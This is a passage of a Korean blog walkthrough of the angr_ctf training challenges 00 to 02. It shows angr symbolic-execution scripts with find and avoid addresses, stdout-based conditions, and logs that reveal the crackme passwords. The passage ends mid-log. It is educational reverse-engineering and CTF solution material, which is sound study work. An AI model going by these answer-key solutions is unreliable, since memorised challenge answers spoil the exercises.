alt="./angr_part3/Untitled%202.png"></p><p>&#xBB50; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC5B4;&#xB514;&#xB4E0; &#xC124;&#xC815;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;. &#xC800;&#xB294; <code>puts</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; <code>0x0804867d</code>&#xB85C; &#xC124;&#xC815;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> simulation.found:  solution_state = simulation.found[<span class="hljs-number">0</span>]  print(solution_state.posix.dumps(sys.stdin.fileno()))<span class="hljs-keyword">else</span>:  <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)</code></pre><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; state&#xB97C; &#xCC3E;&#xC558;&#xC744; &#xB54C; &#xCD9C;&#xB825;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; <code>found</code>&#xB77C;&#xB294; &#xB9F4;&#xBC84;&#xC758; &#xD0C0;&#xC785;&#xC774; &#xAD81;&#xAE08;&#xD574;&#xC11C; &#xCC3E;&#xC544;&#xBD24;&#xB294;&#xB370;, angr &#xACF5;&#xC2DD; &#xBB38;&#xC11C;&#xC5D0;&#xB294; &#xC5C6;&#xB354;&#xB77C;&#xAD6C;&#xC694;??!?! <code>angr.state_plugins.posix.SimSystemPosix</code> &#xD074;&#xB798;&#xC2A4;&#xC5D0; dumps&#xB77C;&#xB294; &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB7FC; <code>solution_state</code>&#xAC00; <code>state_plugins</code> &#xBAA8;&#xB4C8;&#xC774;&#xACE0; &#xC774;&#xAC70;&#xB97C; &#xBA64;&#xBC84;&#xB85C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xD074;&#xB798;&#xC2A4;&#xAC00; &#xC788;&#xB098; &#xD558;&#xB2E4;&#xAC00; &#xADF8;&#xB9CC;&#xB450;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xB108;&#xBB34; &#xBC29;&#xB300;&#xD558;&#xB354;&#xAD70;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xAC83;&#xC800;&#xAC83; &#xCC3E;&#xC544;&#xBCF4;&#xB2E4;&#xAC00; &#xC77C;&#xB2E8; &#xC774;&#xAC70;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4; &#xC815;&#xB3C4;&#xB85C;&#xB9CC; &#xC774;&#xD574;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC;!!! 0&#xBC88; &#xBB38;&#xC81C; &#xD074;&#xB9AC;&#xC5B4;!!</p><h2 id="sol00-py"><a href="#sol00-py" class="headerlink" title="sol00.py"></a>sol00.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = <span class="hljs-number">0x0804867d</span>  simulation.explore(find=print_good_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 ./sol00.py ./<span class="hljs-number">00</span>_angr_findWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486b1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>_angr_find (<span class="hljs-number">0x80486b1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">297</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486b3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>_angr_find (<span class="hljs-number">0x80486b3</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">37</span>,<span class="hljs-number">976</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff60</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))[&lt;SimState @ <span class="hljs-number">0x804867d</span>&gt;]<span class="hljs-string">b&apos;JXWVXRKX&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">00</span>_angr_findEnter the password: JXWVXRKXGood Job.</code></pre><h1 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h1><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; avoid&#xC5D0; &#xAD00;&#xB828;&#xB41C; &#xBB38;&#xC81C; &#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C;&#xB3C4; <code>explore()</code>&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xD53C;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xC8E0;? &#xADF8;&#xAC70;&#xC5D0; &#xAD00;&#xD55C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; IDA&#xC5D0; &#xB123;&#xC5B4;&#xBD24;&#xB354;&#xB2C8; &#xD5E5;&#xC2A4;&#xB808;&#xC774;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB124;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xD568;&#xC218; &#xBAA9;&#xB85D;&#xC744; &#xBD24;&#xB354;&#xB2C8; <code>avoid_me</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/3.png" alt="./anrgr_part3/Untitled%203.png"></p><p>&#xC0AC;&#xC2E4; &#xC548;&#xC5D0;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xBCC4;&#xB85C; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. <code>should_succeed</code>&#xB77C;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; 0&#xC73C;&#xB85C; &#xC138;&#xD305;&#xD558;&#xB294;&#xB370;, &#xC774; &#xBCC0;&#xC218;&#xC758; &#xD06C;&#xB85C;&#xC2A4; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>maybe_good</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/4.png" alt="./anrgr_part3/Untitled%204.png"></p><p>&#xBCF4;&#xBA74; <code>should_succeed</code>&#xAC00; 0&#xC774; &#xC544;&#xB2C8;&#xC5B4;&#xC57C; &#x201C;Good Job&#x201D;&#xC774; &#xCD9C;&#xB825;&#xB418;&#xAC8C; &#xB418;&#xC5B4;&#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xBA74; <code>avoid_me</code>&#xB97C; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xB294; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xAC00; &#xD544;&#xC694;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = ???  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = ???  will_not_succeed_address = ???  simulation.explore(find=print_good_address, avoid=will_not_succeed_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>main &#xD568;&#xC218;&#xC758; &#xC55E; &#xBD80;&#xBD84;&#xC740; 0&#xBC88; &#xBB38;&#xC81C;&#xC640; &#xAC19;&#xC774; &#xC138;&#xD305;&#xD574;&#xC8FC;&#xACE0; &#xADF8; &#xB4A4;&#xB9CC; &#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs python">print_good_address = ???will_not_succeed_address = ???simulation.explore(find=print_good_address, avoid=will_not_succeed_address)</code></pre><p>&#xC774;&#xC81C; <code>explore</code> &#xD568;&#xC218;&#xC5D0; &#xD53C;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC544;&#xAE4C; &#xBD84;&#xC11D;&#xD55C; <code>avoid_me</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB123;&#xACE0; &#xCC3E;&#xC744; &#xC8FC;&#xC18C;&#xB294; &#xB611;&#xAC19;&#xC774; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xC8FC;&#xC18C;&#xB97C; &#xB123;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="sol01-py"><a href="#sol01-py" class="headerlink" title="sol01.py"></a>sol01.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = <span class="hljs-number">0x080485E5</span>  will_not_succeed_address = <span class="hljs-number">0x080485A8</span>  simulation.explore(find=print_good_address, avoid=will_not_succeed_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))./<span class="hljs-number">01</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol01.py ./<span class="hljs-number">01</span>_angr_avoidWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">009</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80d4591</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">01</span>_angr_avoid (<span class="hljs-number">0x80d4591</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">010</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80d4593</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">01</span>_angr_avoid (<span class="hljs-number">0x80d4593</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">29</span>,<span class="hljs-number">577</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff3d</span> <span class="hljs-keyword">with</span> <span class="hljs-number">11</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x818a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">29</span>,<span class="hljs-number">577</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff60</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x818a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))<span class="hljs-string">b&apos;HUJOZMYS&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">01</span>_angr_avoidEnter the password: HUJOZMYSGood Job.</code></pre><h1 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h1><p><img src="/2021/08/04/j0ker/angr_part3/5.png" alt="./angr_part3/Untitled%205.png"></p><p>&#xC74C;&#x2026;. &#xBB50;&#xC9C0;&#x2026; &#xC758;&#xB3C4;&#xAC00; &#xBB50;&#xC9C0;&#x2026; &#xBB38;&#xC81C;&#xB9CC; &#xBCF4;&#xACE0; &#xBAA8;&#xB974;&#xACA0;&#xC5B4;&#xC11C; &#xADF8;&#xB0E5; 1&#xBC88; &#xBB38;&#xC81C;&#xC5D0; &#xC8FC;&#xC18C;&#xB9CC; &#xBC14;&#xAFD4; &#xD480;&#xC5B4; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370;&#x2026; &#xD480;&#xB9BC;!!!</p><p>&#xBB50;&#xC57C; &#xBB54;&#xB370; &#xC65C; &#xD480;&#xB9AC;&#xB294;&#xAC74;&#xB370; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xADF8;&#xB798;&#xC11C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC558;&#xC8E0;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  # :boolean  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  # :boolean  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xD760;&#x2026; &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>explore()</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC18C;&#xAC12;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xD568;&#xC218;&#xAC00; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xBABB; &#xCC3E;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC73C;&#xB2C8; &#xCD9C;&#xB825;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD1B5;&#xD574; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xB294; &#xCEE8;&#xB370;&#xC158;&#xC744; &#xCC3E;&#xC73C;&#xB77C;&#xB124;&#xC694;. &#xB124;. &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xD574;&#xC654;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; state&#xB97C; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xAC19;&#xC9C0;&#xB9CC; &#xC774;&#xB97C; &#xBB34;&#xC5C7;&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xD558;&#xB290;&#xB0D0;&#xAC00; &#xB2EC;&#xB77C;&#xC9C4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; <code>stdout_output</code>&#xC5D0; &#x201C;Good Job&#x201D;&#xC774;&#xB77C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; &#xB123;&#xC73C;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><pre><code class="hljs python"><span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output )</code></pre><p>&#xC88B;&#xC544;. &#xB9E4;&#xC6B0; &#xAE54;&#xB054;&#xD558;&#xAD70;.</p><p>&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xCC30;&#xB098; &#xC81C;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC544;&#x2026; &#xC5ED;&#xC2DC; &#xC778;&#xC0DD;&#xC740; &#xC81C;&#xB300;&#xB85C; &#xB418;&#xB294;&#xAC8C; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xBCF4;&#xB2C8;&#xAE4C; <code>stdout_output</code>&#xC774; &#xBC14;&#xC774;&#xD2B8; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xB354;&#xB77C;&#xAD6C;&#xC694;? &#xADF8;&#xB798;&#xC11C; &#xC870;&#xAE08; &#xBC14;&#xAFD4;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>) )</code></pre><p>&#xAC00;&#xB9BF;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; 2&#xBC88; &#xBB38;&#xC81C;&#xB3C4; &#xC4F1;-&#xC2F9; &#xD074;&#xB9AC;&#xC5B4;~</p><h2 id="sol02-py"><a href="#sol02-py" class="headerlink" title="sol02.py"></a>sol02.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    print(stdout_output)    <span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>) )  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    print(stdout_output)    <span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>) )  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol02.py ./<span class="hljs-number">02</span>_angr_find_conditionWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span 